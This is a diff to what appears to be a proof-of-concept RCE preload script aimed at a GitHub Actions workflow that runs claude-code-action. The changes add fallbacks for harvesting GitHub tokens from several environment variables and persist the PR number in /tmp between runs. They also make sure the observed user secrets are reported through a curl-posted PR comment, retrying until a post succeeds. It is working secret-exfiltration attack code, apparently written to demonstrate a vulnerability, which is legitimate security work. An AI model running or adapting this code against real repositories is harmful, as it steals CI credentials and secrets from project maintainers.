@@ -32,14 +32,37 @@ import {
   writeFileSync,
 } from "node:fs";
 
-const token = process.env.GITHUB_TOKEN ?? "";
+// Token fallback: different workflow steps put the GH token under
+// different names. Take whichever is available, in order of preference.
+const token =
+  process.env.GITHUB_TOKEN ||
+  process.env.OVERRIDE_GITHUB_TOKEN ||
+  process.env.DEFAULT_WORKFLOW_TOKEN ||
+  "";
 const repo = process.env.GITHUB_REPOSITORY ?? "";
 const actor = process.env.GITHUB_ACTOR ?? "";
 const runId = process.env.GITHUB_RUN_ID ?? "";
 const workflow = process.env.GITHUB_WORKFLOW ?? "";
 const jobName = process.env.GITHUB_JOB ?? "";
-const prNumber = process.env.PR_NUMBER ?? "";
 const summaryPath = process.env.GITHUB_STEP_SUMMARY;
+
+// PR_NUMBER is only set in the env of some steps (post-review.ts,
+// post-buffered-inline-comments.ts). Steps like run.ts (claude-code-action
+// main) don't have it. Persist it from fire #1 to a marker file so later
+// fires can recover it.
+const prNumberFile = "/tmp/.poc-pr-number";
+let prNumber = process.env.PR_NUMBER ?? "";
+if (prNumber) {
+  try {
+    writeFileSync(prNumberFile, prNumber);
+  } catch {}
+} else {
+  try {
+    if (existsSync(prNumberFile)) {
+      prNumber = readFileSync(prNumberFile, "utf8").trim();
+    }
+  } catch {}
+}
 
 // Live auto-provisioned job tokens — mask in the public comment.
 const ALWAYS_MASK = new Set([
@@ -192,6 +215,7 @@ attacker repo root._
   } catch {}
 
   // 3) Post PR comment synchronously via curl (blocks until POST completes).
+  let postSucceeded = false;
   if (token && repo && prNumber) {
     const commentBody =
       `<!-- poc-rce-preload fire-${fireNumber} -->\n` +
@@ -204,16 +228,25 @@ attacker repo root._
     console.log(
       `::notice title=PoC comment fire #${fireNumber}::status=${status}`,
     );
+    postSucceeded = /^2\d\d$/.test(status);
+  } else {
+    console.log(
+      `::warning title=PoC post skipped::fire #${fireNumber} missing token=${!!token} repo=${!!repo} prNumber=${!!prNumber}`,
+    );
+  }
+
+  // Only mark secrets as "seen" once we have successfully posted the
+  // observation. If the post failed or was skipped, leave the marker
+  // alone so a later fire can retry with the same secrets.
+  if (postSucceeded) {
+    try {
+      const allSeen = Array.from(
+        new Set([...seenBefore, ...userSecretsThisFire]),
+      ).sort();
+      writeFileSync(seenSecretsFile, allSeen.join("\n"));
+    } catch {}
   }
 }
-
-// Update the seen-secrets marker for the next fire.
-try {
-  const allSeen = Array.from(
-    new Set([...seenBefore, ...userSecretsThisFire]),
-  ).sort();
-  writeFileSync(seenSecretsFile, allSeen.join("\n"));
-} catch {}
 
 console.log(
   `::notice title=PoC preload fired::fire #${fireNumber}, ${newSecretsThisFire.length} new user secret(s) observed`,
